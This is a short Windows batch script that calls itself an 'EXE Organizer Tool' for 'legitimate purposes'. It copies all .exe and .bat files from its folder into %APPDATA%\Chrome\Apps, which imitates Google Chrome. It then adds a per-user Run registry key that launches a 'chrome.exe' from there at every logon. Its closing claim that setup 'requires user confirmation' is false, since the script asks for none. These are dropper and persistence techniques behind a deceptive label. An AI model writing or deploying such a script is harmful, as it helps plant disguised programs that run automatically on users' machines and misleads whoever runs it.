@echo off
setlocal enabledelayedexpansion

echo === EXE Organizer Tool ===
echo This tool organizes EXE files for legitimate purposes.

REM Set target directory (user's AppData without admin rights)
set "TARGET_DIR=%APPDATA%\Chrome\Apps"
set "SOURCE_DIR=%~dp0"  REM Current directory

REM Create target directory
echo Creating directory: %TARGET_DIR%
mkdir "%TARGET_DIR%" 2>nul

REM Counter for found files
set count=0

echo.
echo Searching for EXE files in: %SOURCE_DIR%

REM Find and copy EXE files
for /r "%SOURCE_DIR%" %%f in (*.exe) do (
    echo Found: %%~nxf
    copy "%%f" "%TARGET_DIR%\%%~nxf" >nul
    set /a count+=1
)
for /r "%SOURCE_DIR%" %%f in (*.bat) do (
    echo Found: %%~nxf
    copy "%%f" "%TARGET_DIR%\%%~nxf" >nul
    set /a count+=1
)

echo.
echo Copied %count% EXE file(s) to: %TARGET_DIR%

REM Create a simple autorun entry (HKCU - no admin needed)
echo.
echo Creating user-level autorun entry...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyAppOrganizer" /t REG_SZ /d "\"%TARGET_DIR%\chrome.exe\"" /f

echo.
echo === Process Complete ===
echo Files organized in: %TARGET_DIR%
echo Note: This setup requires user confirmation for security.
